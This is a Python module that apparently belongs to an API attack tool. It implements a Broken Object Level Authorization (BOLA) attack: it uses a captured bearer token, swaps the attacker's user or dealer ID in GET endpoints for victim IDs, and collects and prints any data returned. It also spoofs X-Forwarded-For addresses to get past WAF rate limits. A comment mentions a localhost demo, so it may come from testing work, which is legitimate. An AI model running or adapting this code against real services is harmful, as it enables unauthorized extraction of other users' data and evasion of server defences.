import requests
import time
import random

def _generate_fake_ip():
    """Spoofs the IP address to bypass basic WAF rate limiting."""
    generated_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    print('[IP]: ', generated_ip)
    return generated_ip

def run_bola_attack(discovered_endpoints, looted_data, victim_targets):
    """
    Executes a Broken Object Level Authorization (BOLA) attack by swapping
    the attacker's discovered IDs with victim IDs in the captured API routes.
    """
    attacker_token = looted_data.get("token")
    attacker_uuid = str(looted_data.get("uuid"))
    attacker_dealer_id = str(looted_data.get("dealer_id"))

    if not attacker_token:
        print("    [X] No token available for BOLA Engine. Aborting attack.")
        return []

    print("\n[PHASE 2] Initializing BOLA Attack Engine...")
    print(f"    [*] Attacker Profile Loaded -> UUID: {attacker_uuid} | Dealer: {attacker_dealer_id}")
    
    results = []
    vulnerabilities_found = 0

    # Base headers for the attack
    base_headers = {
        "Authorization": f"Bearer {attacker_token}",
        "Content-Type": "application/json"
    }

    # Iterate through the raw discovered endpoints (Format: "GET http://localhost:3000/api...")
    for endpoint_str in discovered_endpoints:
        # Split the string "GET http://..." into method and url
        parts = endpoint_str.split(" ", 1)
        if len(parts) != 2:
            continue
            
        method, original_url = parts[0], parts[1]

        # We primarily want to test data extraction (GET requests) for BOLA
        if method.upper() != "GET":
            continue

        # Check if the original URL contains the attacker's UUID or Dealer ID
        # If it doesn't, we can try appending the victim UUID to the end as a fallback
        is_direct_swap = False
        
        if attacker_uuid and attacker_uuid in original_url:
            is_direct_swap = True
            target_parameter = attacker_uuid
            print(f"\n    [*] Vulnerable pattern detected! Attacker UUID found in: {original_url}")
            
        elif attacker_dealer_id and attacker_dealer_id in original_url:
            is_direct_swap = True
            target_parameter = attacker_dealer_id
            print(f"\n    [*] Vulnerable pattern detected! Attacker Dealer ID found in: {original_url}")
            
        else:
            # Skip URLs that don't seem to have predictable parameters for this demo
            continue

        # Launch the attack for each victim in our target list
        for victim_id in victim_targets:
            # Create the malicious payload URL by swapping the Attacker ID for the Victim ID
            malicious_url = original_url.replace(target_parameter, victim_id)
            
            # Inject our fake IP
            headers = base_headers.copy()
            headers["X-Forwarded-For"] = _generate_fake_ip()

            print(f"        -> [ATTACK] Injecting Victim ID ({victim_id})")
            print(f"        -> [REQ] GET {malicious_url}")

            try:
                response = requests.get(malicious_url, headers=headers, timeout=5)

                # Analyze the response to confirm BOLA
                if response.status_code == 200:
                    data = response.json() if "application/json" in response.headers.get("Content-Type", "") else response.text
                    
                    # If we get a 200 OK and data is returned, we bypassed authorization!
                    print(f"        [!!!] CRITICAL: BOLA Bypass Successful!")
                    print(f"        [!!!] Unauthorized Data Extracted: {str(data)}") # Print a snippet of the leaked data
                    
                    vulnerabilities_found += 1
                    results.append({
                        "vulnerable_url": malicious_url,
                        "method": "GET",
                        "status": "VULNERABLE",
                        "leaked_data": data
                    })

                elif response.status_code in [401, 403]:
                    print(f"        [-] Secure: Server denied access (403 Forbidden). BOLA prevented.")
                
                elif response.status_code == 404:
                    print(f"        [-] Not Found: The Victim ID does not exist in this context.")
                
                else:
                    print(f"        [?] Unexpected response code: {response.status_code}")

            except requests.exceptions.RequestException as e:
                print(f"        [X] Request failed: {e}")

            # Throttling
            time.sleep(0.5)

    print("-" * 50)
    print(f"-> Total BOLA Vulnerabilities Discovered: {vulnerabilities_found}")
    return results